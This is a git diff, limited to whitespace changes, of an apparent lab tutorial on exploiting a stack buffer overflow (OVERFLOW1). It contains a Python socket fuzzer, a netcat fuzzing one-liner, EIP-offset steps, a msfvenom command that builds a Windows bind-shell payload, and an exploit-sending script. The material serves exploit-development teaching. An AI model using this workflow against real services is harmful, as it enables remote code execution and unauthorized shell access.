@@ -20,22 +20,22 @@ prefix = "OVERFLOW1 "
 fuzzing_string = prefix + "A" * 100
 
 while True:
-	try: 
-		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-			s.settimeout(timeout)
-			s.connect((host, port))
-			s.recv(1024)
-			print("Fuzzing with {} bytes".format(len(fuzzing_string) - len(prefix)))
-			s.send(bytes(fuzzing_string, "latin-1"))
-			s.recv(1024)
-	except:
-		print("Fuzzing crashed at {} bytes".format(len(fuzzing_string) - len(prefix)))
-		sys.exit(0)
-	fuzzing_string += "A" * 100
-	time.sleep(1)
+    try: 
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+            s.settimeout(timeout)
+            s.connect((host, port))
+            s.recv(1024)
+            print("Fuzzing with {} bytes".format(len(fuzzing_string) - len(prefix)))
+            s.send(bytes(fuzzing_string, "latin-1"))
+            s.recv(1024)
+    except:
+        print("Fuzzing crashed at {} bytes".format(len(fuzzing_string) - len(prefix)))
+        sys.exit(0)
+    fuzzing_string += "A" * 100
+    time.sleep(1)
 ```
 
-#### Example: 
+#### Example:
 
 ```text
 python3 fuzzer.py 
@@ -60,18 +60,17 @@ Fuzzing with 1800 bytes
 Fuzzing with 1900 bytes
 Fuzzing with 2000 bytes
 Fuzzing crashed at 2000 bytes
-
 ```
 
-### Manual fuzzing 
+### Manual fuzzing
 
 ```text
-python3 -c "print('A' * 200)" | nc 10.10.128.114 31337 
+python3 -c "print('A' * 200)" | nc 10.10.128.114 31337
 ```
 
 ## Crash Replication & Controlling EIP
 
-Next step would be to find our offset and controlling the EIP value. 
+Next step would be to find our offset and controlling the EIP value.
 
 ### Using msf `pattern_create.rb`
 
@@ -107,7 +106,6 @@ Options:
     -l, --length <length>            The length of the pattern
     -s, --sets <ABC,def,123>         Custom Pattern Sets
     -h, --help                       Show this message
-
 ```
 
 #### Example:
@@ -133,11 +131,11 @@ This command finds all "jmp esp" \(or equivalent\) instructions with addresses t
 
 ### Setting the breakpoint
 
-In Immunity press Cntrl+G and paste the value of where we going to jump to.   
-Set breakpoint by pressing F2 at the location.   
+In Immunity press Cntrl+G and paste the value of where we going to jump to.  
+Set breakpoint by pressing F2 at the location.  
 F7 to step and should jump to our C buffer.
 
-## Generating the Payload 
+## Generating the Payload
 
 ```text
 msfvenom -p windows/shell_bind_tcp LHOST=10.9.2.17 LPORT=53 EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f c
@@ -262,11 +260,11 @@ junk = "A" * offset_start
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-	s.connect((host, port))
-	print("Sending payload to {}:{}".format(host, port))
-	s.recv(1024)
-	s.send(bytes(buf + "\r\n", "latin-1"))
-	print("Done!")
+    s.connect((host, port))
+    print("Sending payload to {}:{}".format(host, port))
+    s.recv(1024)
+    s.send(bytes(buf + "\r\n", "latin-1"))
+    print("Done!")
 except:
   print("Could not connect.")
 ```
